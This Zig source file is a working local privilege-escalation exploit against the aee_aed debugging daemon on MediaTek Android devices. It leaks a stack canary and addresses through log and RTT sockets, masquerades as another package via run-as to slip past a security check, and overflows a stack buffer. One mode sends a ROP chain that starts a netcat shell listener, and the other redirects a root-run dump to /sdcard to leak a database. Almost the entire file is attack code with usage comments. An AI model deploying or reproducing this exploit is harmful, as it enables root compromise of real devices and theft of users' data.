const std = @import("std");
const os = std.os;
const print = std.debug.print;
const Prng = std.rand.DefaultPrng;
const android = @import("android.zig");
const rttd = @import("rttd.zig");
const logd = @import("logd.zig");
const processd = @import("processd.zig");
const RTTClient = rttd.RTTClient;
const RTTPacket = rttd.RTTPacket;
const RTTCmd = rttd.RTTCmd;
const LogClient = logd.LogClient;
const ProcessClient = processd.ProcessClient;
const AedProcHeader = processd.AedProcHeader;
const AedProcCmd = processd.AedProcCmd;
const AedProcCmdType = processd.AedProcCmdType;
const AedProcExp = processd.AedProcExp;

const PTR_SIZE = @sizeOf(usize);
const TRIGGER_CANARY_OFFSET = 0x10e8 - 0x3c;
const WORKER_CANARY_OFFSET = (0x120 - 0x5a0 - 0x7a3a0 - 0x50 - 0x3c);

const REPORT_MODULE_OFFSET = 0xa0d4;
const REPORT_TMPDATABASE_OFFSET = 0x1000;
const WORKER_REPORT_OFFSET = (0x120 - 0x5a0 - 0x7a340);
const TRIGGER_TIME_PREFIX = "Trigger time:[";
const TRIGGER_TIME_SUFFIX = "]\x00";

// For system_ext aee_aed
const AEE_PROCESSD_SOCKNAME = "\x00com.mtk.aee.aed";
const AEE_RTTD_SOCKNAME = "\x00aee:rttd";
const AEE_COMM = "aee_aed\n";
const SYSTEM_GADGET = (0x2fd6c - 0x10000) | 1;
const SYSTEM_CMD_OFFSET = 0x38;

// For vendor aee_aedv
// Not that you have permissions to connect anyways...
//
// const AEE_PROCESSD_SOCKNAME = "\x00com.mtk.aee.aedv";
// const AEE_RTTD_SOCKNAME = "\x00aee:vrttd";
// const AEE_COMM = "aee_aedv\n";
// const SYSTEM_GADGET = (0x280ca - 0x10000) | 1;
// const SYSTEM_CMD_OFFSET = 0x38;

const DBPATH_MAX = 64;
const RTTD_FD = 3;
const LOGD_FD = 4;
const PROCESSD_FD = 5;

// Print statements with this banner at the beginning have a stable CLI output
// All other print statements are for debugging
const STABLE_BANNER = ">>>>>>>>";

const FrameSave32 = struct {
    canary: u32 = 0xffffffff,
    d0l: u32 = 0xffffffff,
    d0h: u32 = 0xffffffff,
    d1l: u32 = 0xffffffff,
    d1h: u32 = 0xffffffff,
    __pad: u32 = 0xffffffff,
    r4: u32 = 0xffffffff,
    r5: u32 = 0xffffffff,
    r6: u32 = 0xffffffff,
    r7: u32 = 0xffffffff,
    r8: u32 = 0xffffffff,
    r9: u32 = 0xffffffff,
    r10: u32 = 0xffffffff,
    r11: u32 = 0xffffffff,
    lr: u32 = 0xffffffff,
};

const ExploitParams = struct {
    canary: usize = 0,
    worker: usize = 0,
    base: usize = 0,
    dbnum: u32 = 0,
    pid: i32 = 0,
    __workeridx: u8 = 0,
};

// Start the exploit using processd to dump pid and tid if desired
// After this, pwn can be called immediately after to send the payload
fn handshake(client: *ProcessClient, pid: i32, tid: i32) !void {
    // seq and len fields reused for pid and tid respectively
    var hdr: AedProcHeader = .{
        .cmdtype = @intFromEnum(AedProcCmdType.ind),
        .cmd = @intFromEnum(AedProcCmd.ind_fatal),
        .seq = @bitCast(pid),
        .exp = @intFromEnum(AedProcExp.undef),
        .len = @bitCast(tid),
    };

    // Write the initial header to give pid and tid
    _ = try client.write(&hdr, &.{});

    // The exception type is not important so give a generic exception
    _ = try client.read(&hdr, &.{});
    const exception = "FATAL\x00";
    hdr.len = exception.len;
    _ = try client.write(&hdr, exception);
}

pub fn parameter_parse(paramstr: []const u8) !ExploitParams {
    var params: ExploitParams = .{};
    var iterator = std.mem.split(u8, paramstr, ",");
    while (iterator.next()) |p| {
        const base = "base=";
        const pid = "pid=";
        const dbnum = "dbnum=";
        const workeridx = "workeridx=";
        if (std.mem.startsWith(u8, p, base)) {
            params.base = try std.fmt.parseInt(usize, p[base.len..], 0);
        } else if (std.mem.startsWith(u8, p, pid)) {
            params.pid = try std.fmt.parseInt(i32, p[pid.len..], 0);
        } else if (std.mem.startsWith(u8, p, dbnum)) {
            params.dbnum = try std.fmt.parseInt(u32, p[dbnum.len..], 0);
        } else if (std.mem.startsWith(u8, p, workeridx)) {
            params.__workeridx = try std.fmt.parseInt(u8, p[workeridx.len..], 0);
        }
    }
    return params;
}

fn parameter_leak(params: *ExploitParams, client: *LogClient) !void {
    while (true) {
        const rttd_needle = "Got RTT_AEE_CLEANDAL: ";
        const worker_needle = ", worker ";
        var data: [logd.LOGGER_ENTRY_MAX_LEN]u8 = undefined;
        var log = data[0..try client.read(&data)];
        if (log.len == 0) break;
        var needle = std.mem.lastIndexOf(u8, log, rttd_needle);
        if (needle != null) {
            var canary_slice = log[needle.? + rttd_needle.len ..];
            const lookahead = @sizeOf(@TypeOf(@as(RTTPacket, undefined).data));
            if (canary_slice.len >= lookahead + PTR_SIZE) {
                params.canary = std.mem.bytesToValue(usize, canary_slice[lookahead .. lookahead + PTR_SIZE]);
            }
        }
        needle = std.mem.lastIndexOf(u8, log, worker_needle);
        if (needle != null) {
            var worker_slice = log[needle.? + worker_needle.len .. std.mem.lastIndexOf(u8, log, ",").?];
            var tmpworker = std.fmt.parseInt(usize, worker_slice, 0) catch 0;
            if (tmpworker != 0) params.worker = tmpworker - 0xc * params.__workeridx;
        }
    }
}

pub fn trigger(client: *ProcessClient, payload: []u8) !void {
    for (payload) |b| {
        if (b == ']' or b == '\x00') {
            print("Payload contains blacklisted char ({})! Throwing error!\n", .{b});
            return error.InvalidValue;
        }
    }
    var hdr: AedProcHeader = .{
        .cmdtype = 0,
        .cmd = 0,
        .seq = 0,
        .exp = 0,
    };
    _ = try client.read(&hdr, &.{});
    hdr.len = TRIGGER_TIME_PREFIX.len + payload.len + TRIGGER_TIME_SUFFIX.len;
    var iovecs: [3]std.os.iovec_const = .{
        .{
            .iov_base = TRIGGER_TIME_PREFIX,
            .iov_len = TRIGGER_TIME_PREFIX.len,
        },
        .{
            .iov_base = @ptrCast(payload),
            .iov_len = payload.len,
        },
        .{
            .iov_base = TRIGGER_TIME_SUFFIX,
            .iov_len = TRIGGER_TIME_SUFFIX.len,
        },
    };
    try client.writev(&hdr, &iovecs);
}

// Use /sdcard instead of /data/local/tmp because we want
// the option of deleting the file the root user makes,
// as I learned the hard way...
pub fn mkdbpath(uniq: u32, dbpath: *[DBPATH_MAX]u8) ![]u8 {
    return std.fmt.bufPrint(dbpath, "/sdcard/db.{}\x00", .{uniq});
}

pub fn main() !void {
    // Get current attribute because shell is not allowed to communicate with process worker
    var is_shell = false;
    {
        var data: [256]u8 = undefined;
        var attrfp = try std.fs.openFileAbsolute("/proc/self/attr/current", .{});
        defer attrfp.close();
        var len = try attrfp.readAll(&data);
        var attr = data[0..len];
        is_shell = std.mem.startsWith(u8, attr, "u:r:shell:s0");
    }

    // If we are the shell user, open the sockets then masquerade as another app to bypass security check
    if (is_shell) {
        var args = std.process.args();
        if (args.inner.count < 3) {
            print("Usage: {s} <PkgName> <BaseAddress> [WorkerNum]\nMasquerade as another package to overcome dynamic_security_check\n", .{args.next().?});
            print("Do ROP when base != 0 or leak database when base == 0\n", .{});
            print("If WorkerNum is specified, use this number instead of 0\n", .{});
            std.os.exit(1);
            return;
        }

        // Get the pid of aee_aed
        var pid: i32 = -1;
        var procdir = try std.fs.openIterableDirAbsolute("/proc", .{});
        var prociter = procdir.iterate();
        while (try prociter.next()) |pidname| {
            var tmppid = std.fmt.parseInt(i32, pidname.name, 0) catch -1;
            if (tmppid > 0) {
                var commbuf: [64]u8 = undefined;
                var commname = try std.fmt.bufPrint(&commbuf, "/proc/{}/comm", .{tmppid});
                if (std.fs.openFileAbsolute(commname, .{})) |commfile| {
                    var commvalue = commbuf[0..try commfile.readAll(&commbuf)];
                    commfile.close();
                    if (std.mem.startsWith(u8, commvalue, "aee_aed\n")) {
                        pid = tmppid;
                        print("{s} FOUND AEE_AED ({})\n", .{ STABLE_BANNER, pid });
                        break;
                    }
                } else |_| {
                    // Sometimes, PermissionDenied will come up so just ignore that...
                    continue;
                }
            }
        }
        procdir.close();
        if (pid == -1) {
            print("Was unable to find the pid of aee_aed!\n", .{});
            std.os.exit(1);
        }

        // Execute this program again but use run-as to change the
        // SELinux context and bypass the dynamic_security_check
        var myname = args.next().?;
        var pkgname = args.next().?;
        var base = try std.fmt.parseInt(usize, args.next().?, 0);
        var workeridx = try std.fmt.parseInt(u8, args.next() orelse "0", 0);
        var prng = Prng.init(@bitCast(std.time.microTimestamp()));
        var rnd = prng.random();
        var myname_buf: [4096]u8 = undefined;
        var fauxname_buf: [32]u8 = undefined;
        var fauxname = try std.fmt.bufPrint(&fauxname_buf, "./killer{}", .{rnd.int(u32)});
        var data: [4096]u8 = undefined;

        // Only if we're leaking the database do we need to make a database beforehand
        var dbnum = rnd.int(u32);
        if (base == 0) {
            var dump_path_buf: [DBPATH_MAX]u8 = undefined;
            var dump_path = try mkdbpath(dbnum, &dump_path_buf);
            _ = try std.fs.makeDirAbsoluteZ(@ptrCast(dump_path));
        }

        // Format the command for 'sh -c' invocation
        const cmdline = @as([*:0]const u8, @ptrCast(try std.fmt.bufPrint(&data, "cp '{s}' '{s}' && '{s}' 'workeridx={},base={},pid={},dbnum={}' ; rm -f '{s}'\x00", .{
            try std.os.realpath(myname, &myname_buf),
            fauxname,
            fauxname,
            workeridx,
            base,
            pid,
            dbnum,
            fauxname,
        })));

        // Use run-as with 'sh -c' to bypass security check
        const runas = @as([*:0]const u8, @ptrCast("/system/bin/run-as\x00"));
        var childargs_array = [_]?[*:0]const u8{
            runas,
            @as([*:0]const u8, @ptrCast(pkgname)),
            "sh",
            "-c",
            cmdline,
            null,
        };
        var childenv_array = [_]?[*:0]const u8{
            null,
        };
        var childargs = @as([*:null]?[*:0]const u8, @ptrCast(&childargs_array));
        var childenv = @as([*:null]?[*:0]const u8, @ptrCast(&childenv_array));

        // Open and leak streams so that child can have them on the following exec
        var stream = try android.connectUnixSocketStream(AEE_RTTD_SOCKNAME);
        if (stream.handle != RTTD_FD) _ = std.os.linux.dup2(stream.handle, RTTD_FD);
        stream = try android.connectUnixSocketSeqpacket(logd.rsockname);
        _ = try stream.writeAll("dumpAndClose lids=0");
        if (stream.handle != LOGD_FD) _ = std.os.linux.dup2(stream.handle, LOGD_FD);
        stream = try android.connectUnixSocketStream(AEE_PROCESSD_SOCKNAME);
        if (stream.handle != PROCESSD_FD) _ = std.os.linux.dup2(stream.handle, PROCESSD_FD);
        return std.os.execveZ(runas, childargs, childenv);
    }

    // Initialize the sockets in the same order as they were before the execve
    var args = std.process.args();
    _ = args.skip();
    var params = try parameter_parse(args.next().?);
    var rtt_client = RTTClient.init(.{ .handle = RTTD_FD });
    var log_client = LogClient.init(.{ .handle = LOGD_FD });
    var process_client = ProcessClient.init(.{ .handle = PROCESSD_FD });

    // Use RTT CLEANDLAL to leak the stack canary and address
    // The application hangs for a few seconds when I close this
    // without iteracting with it, so just leak the thing anyways.
    var pkt: RTTPacket = .{
        .cmd = @intFromEnum(RTTCmd.clean_dal),
        .pid = 0,
    };
    @memset(&pkt.data, '>');
    _ = try rtt_client.write(&pkt);
    rtt_client.close();

    // Start the handshake of the first client to leak the worker
    // If we're dumping the database, use the pid provided, else
    // use our current pid for convenience in testing.
    if (params.base != 0) params.pid = std.os.linux.getpid();
    try handshake(&process_client, params.pid, params.pid);

    // Read leaked worker and stack canary addresses from logs if not provided as arguments
    try parameter_leak(&params, &log_client);

    // Check if worker and canary are both leaked
    if (params.canary == 0 or params.worker == 0) {
        print("Was unable to find either the stack canary or the generator address! Quitting early!\n[ CANARY : {x} , WORKER : {x} ]\n", .{ params.canary, params.worker });
        std.os.exit(1);
    }
    print("canary={x},worker={x},base={x}\n", .{ params.canary, params.worker, params.base });
    log_client.close();

    // ROP your way to victory with a guessed ASLR offset
    if (params.base != 0) {
        print("ROP your way to victory!!!!\n", .{});
        var payload: [TRIGGER_CANARY_OFFSET + @sizeOf(FrameSave32)]u8 = undefined;

        // Write system command to memory
        // There's several limitations to the commands you can execute
        // * /data/aee_exp is the only location found so far that is read and write accessible
        // * Permission to write new binaries in /data/aee_exp and execute them is denied
        // * Permission to bind to a UNIX socket on /adata/aee_exp is denied
        // * Permission to bind to an abstract UNIX socket is obviously granted because that's what we communicate on
        // * Permission to execute toybox binaries (like netcat) are granted
        //
        // netcat wasn't made with abstract UNIX sockets in mind, but you can still bind one by
        // binding to the empty address like we do here. Similarly, netcat will connect to this
        // same address, so just run this command to take advtanage of the reverse shell
        //
        // nc -U ''
        var fluff: usize = SYSTEM_CMD_OFFSET * 2;
        @memset(payload[0..fluff], ' ');
        var cmdslice = try std.fmt.bufPrint(payload[fluff..], " nc -E -U -s ''  -L sh \n", .{});
        @memset(payload[cmdslice.len + fluff .. TRIGGER_CANARY_OFFSET], ';');

        // Write canary and variables
        // r6 = address to system command
        // lr = Gadget pointing to a call to system from libc in our binary which uses r6
        var gadgetaddr: usize = SYSTEM_GADGET + params.base;
        var cmdaddr = @as(isize, @bitCast(params.worker)) +% (WORKER_CANARY_OFFSET - TRIGGER_CANARY_OFFSET);
        print("Cmd address = {x}\n", .{@as(usize, @bitCast(cmdaddr))});
        print("Gadget address = {x}, Base = {x}\n", .{ gadgetaddr, params.base });
        var frame: FrameSave32 = .{
            .canary = params.canary,
            .r6 = @bitCast(cmdaddr),
            .lr = gadgetaddr,
        };
        @memcpy(payload[TRIGGER_CANARY_OFFSET..], @as([*]const u8, @ptrCast(&frame))[0..@sizeOf(FrameSave32)]);
        try trigger(&process_client, &payload);
        print("{s} PAYLOAD SENT (Run \"nc -U ''\" in the adb shell to connect to it!)\n", .{STABLE_BANNER});
    } else {
        print("Leaking database...\n", .{});
        // Pad out the payload until the canary
        var payload: [TRIGGER_CANARY_OFFSET + @sizeOf(FrameSave32)]u8 = undefined;
        @memset(payload[0..TRIGGER_CANARY_OFFSET], 0xff);

        // We can conveniently overwrite the report address so that the next dump we write
        // overwrites the temporary database path, tricking aee_aed calling dumpstate on
        // a custom path of our choosing instead of /data/aee_exp which is inaccessible by us
        var report_addr = @as(isize, @bitCast(params.worker)) +% (WORKER_REPORT_OFFSET - REPORT_MODULE_OFFSET + REPORT_TMPDATABASE_OFFSET);
        print("Report addr: {x}\n", .{@as(usize, @bitCast(report_addr))});

        // r4 = Report object address
        // r5 = Report object fd
        //
        // We need r5 to be 0, 1, or 2 because it hangs if it's not a valid file descriptor.
        // Conveniently, aee_aed is a daemon (hence the name...) so 0, 1, and 2 is /dev/null
        var frame: FrameSave32 = .{
            .canary = params.canary,
            .r4 = @bitCast(report_addr),
            .r5 = 0,
        };
        // Only data before the r5 register needs to be written
        @memcpy(payload[TRIGGER_CANARY_OFFSET..], @as([*]const u8, @ptrCast(&frame))[0..@sizeOf(FrameSave32)]);
        try trigger(&process_client, payload[0 .. TRIGGER_CANARY_OFFSET + @offsetOf(FrameSave32, "r5")]);

        // Overwrite the dump path with our own
        // Use SDCard because it's always readable and writable by everybody,
        // so the data can be cleared if root writes to this file.
        // This is not the case with /data/local/tmp as I learned the hard way...
        var dump_path_buf: [DBPATH_MAX]u8 = undefined;
        var dump_path = try mkdbpath(params.dbnum, &dump_path_buf);
        var hdr: AedProcHeader = .{
            .cmdtype = 0,
            .cmd = 0,
            .seq = 0,
            .exp = 0,
        };
        _ = try process_client.read(&hdr, &.{});
        hdr.len = dump_path.len;
        _ = try process_client.write(&hdr, dump_path);
        process_client.close();
        // Don't want to print null byte in dump path
        print("{s} DUMP SUCCESSFUL ({s})\n", .{ STABLE_BANNER, dump_path[0 .. dump_path.len - 1] });
    }
}
